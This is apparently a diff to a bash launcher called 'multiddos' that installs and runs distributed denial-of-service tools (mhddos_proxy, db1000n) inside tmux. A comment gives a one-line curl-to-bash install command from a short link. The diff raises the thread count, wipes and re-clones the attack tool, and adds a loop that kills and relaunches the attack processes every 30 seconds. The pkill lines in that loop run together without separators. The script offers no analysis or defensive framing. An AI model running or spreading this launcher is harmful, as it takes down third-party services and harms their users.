@@ -1,6 +1,9 @@
 #!/bin/bash
 # curl -L tiny.one/multiddos | bash && tmux a
 
+export script=`realpath -s $0`
+pkill tmux
+
 cd ~
 rm -rf multiddos
 mkdir multiddos
@@ -11,7 +14,7 @@ db1000n="on"
 uashield="off"
 vnstat="off"
 matrix="off"
-#threads="-t 1000"
+threads="-t 500"
 #rpc="--rpc 2000"
 export debug="--debug"
 
@@ -100,6 +103,7 @@ pip install --upgrade pip
 
 cat > auto_bash.sh << 'EOF'
 cd ~/multiddos/
+rm -rf mhddos_proxy
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
 python3 -m pip install -r requirements.txt
@@ -123,3 +127,20 @@ done
 EOF
 
 launch
+
+restart () {
+while true; do
+if [[ $SECONDS -gt "30" ]]; then
+    #cd ~/multiddos/
+    #exit
+    pkill -f start.py; pkill -f runner.py pkill -f start.py; pkill -f runner.py pkill -f start.py; pkill -f runner.py 
+    bash $script && tmux a && exit
+    echo "restart ..."
+    sleep 3
+fi
+sleep 1
+done
+}
+
+restart&
+
